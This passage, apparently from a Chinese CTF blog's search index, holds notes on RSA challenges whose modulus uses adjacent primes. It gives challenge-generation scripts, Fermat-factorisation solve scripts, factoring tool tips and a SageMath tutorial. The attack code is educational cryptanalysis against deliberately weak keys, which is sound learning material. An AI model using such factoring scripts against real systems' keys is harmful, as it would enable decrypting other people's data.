id="出题脚本-基于N分解的题目"><a href="#出题脚本-基于N分解的题目" class="headerlink" title="出题脚本 -基于N分解的题目"></a>出题脚本 -基于N分解的题目</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAp<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment">#下一个素数</span>q<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>m<span class="token operator">=</span><span class="token string">"flag&#123;a272722c1db834353ea3ce1d9c71feca&#125;"</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qc<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>flag_c<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>c<span class="token punctuation">)</span>rsa_components <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">)</span>keypair <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span>rsa_components<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'pubckey1.pem'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f <span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>keypair<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag_c<span class="token punctuation">)</span>     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本："><a href="#解题脚本：" class="headerlink" title="解题脚本："></a>解题脚本：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">def</span> <span class="token function">isqrt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>  x <span class="token operator">=</span> n  y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n <span class="token operator">//</span> x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>  <span class="token keyword">while</span> y <span class="token operator">&lt;</span> x<span class="token punctuation">:</span>    x <span class="token operator">=</span> y    y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n <span class="token operator">//</span> x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>  <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">fermat</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># int(ceil(n**0.5))</span>    b2 <span class="token operator">=</span> a<span class="token operator">*</span>a <span class="token operator">-</span> n    b <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># int(b2**0.5)</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> b<span class="token operator">*</span>b <span class="token operator">!=</span> b2<span class="token punctuation">:</span>        <span class="token comment"># if verbose:</span>        <span class="token comment">#     print('Trying: a=%s b2=%s b=%s' % (a, b2, b))</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span>        b2 <span class="token operator">=</span> a<span class="token operator">*</span>a <span class="token operator">-</span> n        b <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>b2<span class="token punctuation">)</span> <span class="token comment"># int(b2**0.5)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    p<span class="token operator">=</span>a<span class="token operator">+</span>b    q<span class="token operator">=</span>a<span class="token operator">-</span>b    <span class="token keyword">assert</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q    <span class="token comment"># print('a=',a)</span>    <span class="token comment"># print('b=',b)</span>    <span class="token comment"># print('p=',p)</span>    <span class="token comment"># print('q=',q)</span>    <span class="token comment"># print('pq=',p*q)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pubckey1.pem"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    n<span class="token operator">=</span>key<span class="token punctuation">.</span>n    e<span class="token operator">=</span>key<span class="token punctuation">.</span>e<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    c<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment">#费马分解,</span>n1<span class="token operator">=</span>fermat<span class="token punctuation">(</span>n<span class="token punctuation">)</span>p<span class="token operator">=</span>n1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q<span class="token operator">=</span>n1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>phi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#求逆元</span>d<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于分解N的RSA题目</title>
      <link href="/2023/01/14/RSA/"/>
      <url>/2023/01/14/RSA/</url>
      
        <content type="html"><![CDATA[<h2 id="基于分解N的RSA题目"><a href="#基于分解N的RSA题目" class="headerlink" title="基于分解N的RSA题目"></a>基于分解N的RSA题目</h2><h3 id="1-在线查询分解网站"><a href="#1-在线查询分解网站" class="headerlink" title="1.在线查询分解网站"></a>1.在线查询分解网站</h3><p><a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a> </p><h3 id="2-使用yafu工具分解"><a href="#2-使用yafu工具分解" class="headerlink" title="2.使用yafu工具分解"></a>2.使用yafu工具分解</h3><p>下载地址：<a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></p><pre class="line-numbers language-none"><code class="language-none">#以分解49为例yafu-x64.exe factor(49)#导入文件进行分解，主要注意文本结尾要换行！！！不然要报错yafu-x64.exe &quot;factor(@)&quot; -batchfile 1.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-使用费马分解（适用条件-p-q相近时）"><a href="#3-使用费马分解（适用条件-p-q相近时）" class="headerlink" title="3.使用费马分解（适用条件:p,q相近时）"></a>3.使用费马分解（适用条件:p,q相近时）</h3><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">isqrt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>  x <span class="token operator">=</span> n  y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n <span class="token operator">//</span> x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>  <span class="token keyword">while</span> y <span class="token operator">&lt;</span> x<span class="token punctuation">:</span>    x <span class="token operator">=</span> y    y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n <span class="token operator">//</span> x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>  <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">fermat</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># int(ceil(n**0.5))</span>    b2 <span class="token operator">=</span> a<span class="token operator">*</span>a <span class="token operator">-</span> n    b <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># int(b2**0.5)</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> b<span class="token operator">*</span>b <span class="token operator">!=</span> b2<span class="token punctuation">:</span>        <span class="token comment"># if verbose:</span>        <span class="token comment">#     print('Trying: a=%s b2=%s b=%s' % (a, b2, b))</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span>        b2 <span class="token operator">=</span> a<span class="token operator">*</span>a <span class="token operator">-</span> n        b <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>b2<span class="token punctuation">)</span> <span class="token comment"># int(b2**0.5)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    p<span class="token operator">=</span>a<span class="token operator">+</span>b    q<span class="token operator">=</span>a<span class="token operator">-</span>b    <span class="token keyword">assert</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q    <span class="token comment"># print('a=',a)</span>    <span class="token comment"># print('b=',b)</span>    <span class="token comment"># print('p=',p)</span>    <span class="token comment"># print('q=',q)</span>    <span class="token comment"># print('pq=',p*q)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> qfermat<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment">#分解出p,q之后利用利用脚本求解</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="出题脚本："><a href="#出题脚本：" class="headerlink" title="出题脚本："></a>出题脚本：</h3><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">import libnumimport gmpy2p&#x3D;libnum.generate_prime(1024)#下一个素数q&#x3D;gmpy2.next_prime(p)print(p)print(q)print(gmpy2.is_prime(q))e&#x3D;65537m&#x3D;&quot;flag&#123;20d6e2da95dcc1fa5f5432a436c4be18&#125;&quot;m&#x3D;libnum.s2n(m)n&#x3D;p*qphi_n&#x3D;(p-1)*(q-1)d&#x3D;libnum.invmod(e,phi_n)c&#x3D;pow(m,e,n)print(&quot;n&#x3D;&quot;,n)print (&quot;e&#x3D;&quot;,e)print (&quot;c&#x3D;&quot;,c)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本："><a href="#解题脚本：" class="headerlink" title="解题脚本："></a>解题脚本：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">isqrt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>  x <span class="token operator">=</span> n  y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n <span class="token operator">//</span> x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>  <span class="token keyword">while</span> y <span class="token operator">&lt;</span> x<span class="token punctuation">:</span>    x <span class="token operator">=</span> y    y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n <span class="token operator">//</span> x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>  <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">fermat</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># int(ceil(n**0.5))</span>    b2 <span class="token operator">=</span> a<span class="token operator">*</span>a <span class="token operator">-</span> n    b <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># int(b2**0.5)</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> b<span class="token operator">*</span>b <span class="token operator">!=</span> b2<span class="token punctuation">:</span>        <span class="token comment"># if verbose:</span>        <span class="token comment">#     print('Trying: a=%s b2=%s b=%s' % (a, b2, b))</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span>        b2 <span class="token operator">=</span> a<span class="token operator">*</span>a <span class="token operator">-</span> n        b <span class="token operator">=</span> isqrt<span class="token punctuation">(</span>b2<span class="token punctuation">)</span> <span class="token comment"># int(b2**0.5)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    p<span class="token operator">=</span>a<span class="token operator">+</span>b    q<span class="token operator">=</span>a<span class="token operator">-</span>b    <span class="token keyword">assert</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q    <span class="token comment"># print('a=',a)</span>    <span class="token comment"># print('b=',b)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p='</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q='</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span>    <span class="token comment"># print('pq=',p*q)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> qn<span class="token operator">=</span> <span class="token number">11236396438945464079176717143196471087880430124798640194523124584883161483744355761881720924798661332027501424643154414538029585287580122761405974427818841257794157497994556608202723391478027760181705924317533420305444809223444128034654367210331137068958693840582892819495487826045956577156074156668942232139402108462349340352898572481115406698318121299787982873916502591396884489682255184448165523604671743400422220149772905676655777228607948091675612455989601008858361759327370403306760674195506394280387024357322586732298060169962426894360775981877169895632927906390632063530920611197753716095903307467004289983267</span>e<span class="token operator">=</span> <span class="token number">65537</span>c<span class="token operator">=</span> <span class="token number">4260482466101011731957430920901406417434306478040387371588613512063428441001754753741853444857207349755032658064826592770143368278573527632514794087007140974732031358793249329430363014561312271335226315065519570861993052432656879088776144909638480994662696119431870831156129142403063675855781198930583825083362703887688501680905266707624440432914989795886392952354713859444836529227033324455920455610359249535012999943891644938239837207994673190694512955995798836266797112432609992164908679997257920566918693544746179908166741635316261624634351348613130319346356388546672516037747806222134853885202448682842353199133</span>pq<span class="token operator">=</span>fermat<span class="token punctuation">(</span>n<span class="token punctuation">)</span>p<span class="token operator">=</span>pq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q<span class="token operator">=</span>pq<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>phi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#求逆元</span><span class="token comment">#d=libnum.invmod(e,phi_n)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SageMath</title>
      <link href="/2023/01/14/SageMath/"/>
      <url>/2023/01/14/SageMath/</url>
      
        <content type="html"><![CDATA[<h1 id="SageMath代码"><a href="#SageMath代码" class="headerlink" title="SageMath代码"></a>SageMath代码</h1><h2 id="1-同余运算"><a href="#1-同余运算" class="headerlink" title="1.同余运算"></a>1.同余运算</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相当于将 x 作为需要求得的未知数     Zmod()内填入同余运算的模数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> x<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将同余运算的所有项移到同一边，赋值给函数  f  来表示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行之后就求解出来；以列表形式返回所有解    列表内部是元组类型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f<span class="token punctuation">.</span>smallroots<span class="token punctuation">(</span>upper<span class="token punctuation">)</span>以upper作为求解的上限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>eg</p><p>需要求解</p><p>$ n^2\equiv p^3+a<em>p^2+b</em>p\pmod{moudle} $</p><p>把同余式移到一边</p><p>$ 0\equiv p^3+a<em>p^2+b</em>p-n^2\pmod{moudle} $</p><p>已知 a,b,n,moudle   要求p</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">R<span class="token punctuation">.</span><span class="token operator">&lt;</span>p<span class="token operator">></span> <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>moudle<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> p<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> a<span class="token operator">*</span>p<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">+</span> b<span class="token operator">*</span>p <span class="token operator">-</span> n<span class="token operator">^</span><span class="token number">2</span> f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>那么 p 的所有满足该同余式的解就会返回出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>M <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span><span class="token operator">**</span>e <span class="token operator">-</span> cf <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-基本运算"><a href="#2-基本运算" class="headerlink" title="2.基本运算"></a>2.基本运算</h2><p>sage的大部分基本运算和python都一样、</p><p>比较运算符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">==</span> <span class="token operator">&lt;=</span>  <span class="token operator">>=</span> <span class="token operator">&lt;</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数学运算符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">2</span><span class="token operator">**</span><span class="token number">3</span> 代表幂运算  <span class="token operator">^</span> 和 <span class="token operator">**</span>的作用一样<span class="token operator">%</span>  对于整型参数  <span class="token operator">%</span>代表mod运算<span class="token operator">/</span><span class="token operator">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>常见的数学函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sqrt<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment">#2</span>sin<span class="token punctuation">(</span><span class="token punctuation">)</span>cos<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#有些数学表达式返回的是精确的值而不是近似值，要想得到近似值使用函数n或者方法n（均有一个长名称，numerical_approx,并且函数N和n相同），它们都有可选参数prec，即所需的比特位精度以及digits，即所需的十进制位精度</span>exp<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  e<span class="token operator">^</span><span class="token number">2</span>n<span class="token punctuation">(</span>exp<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#7.38905609893065</span>sin<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>n<span class="token punctuation">(</span>digits<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment">#-0.54402</span>numerical_approx<span class="token punctuation">(</span>pi<span class="token punctuation">,</span>prec<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>  <span class="token comment">#3.1415926535897932384626433832795028841971693993751058209749</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-基础代数和微积分"><a href="#3-基础代数和微积分" class="headerlink" title="3.基础代数和微积分"></a>3.基础代数和微积分</h2><p>solve函数用来求解方程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token operator">=</span>var<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>solve<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">3</span><span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以求解用其他变量表示另一个变量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token operator">=</span>var<span class="token punctuation">(</span><span class="token string">'x b c'</span><span class="token punctuation">)</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span>b<span class="token operator">**</span>x<span class="token operator">+</span>c<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token comment">#[x == -sqrt(-b^x - c), x == sqrt(-b^x - c)]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以求解多个变量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token punctuation">,</span>y<span class="token operator">=</span>var<span class="token punctuation">(</span><span class="token string">'x y'</span><span class="token punctuation">)</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token operator">+</span>y<span class="token operator">==</span><span class="token number">6</span><span class="token punctuation">,</span>x<span class="token operator">-</span>y<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>微分函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">u<span class="token operator">=</span>var<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>diff<span class="token punctuation">(</span>sin<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">,</span>u<span class="token punctuation">)</span><span class="token comment">#cos(u)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>求四阶导数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">diff<span class="token punctuation">(</span>sin<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>求偏导数</p><p>求x^2 + 17*y^2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token punctuation">,</span>y<span class="token operator">=</span>var<span class="token punctuation">(</span><span class="token string">'x,y'</span><span class="token punctuation">)</span>f<span class="token operator">=</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">*</span>y<span class="token operator">^</span><span class="token number">2</span>f<span class="token punctuation">.</span>diff<span class="token punctuation">(</span>x<span class="token punctuation">)</span>f<span class="token punctuation">.</span>diff<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>积分函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">integral<span class="token punctuation">(</span>x<span class="token operator">*</span>sin<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span>cos<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 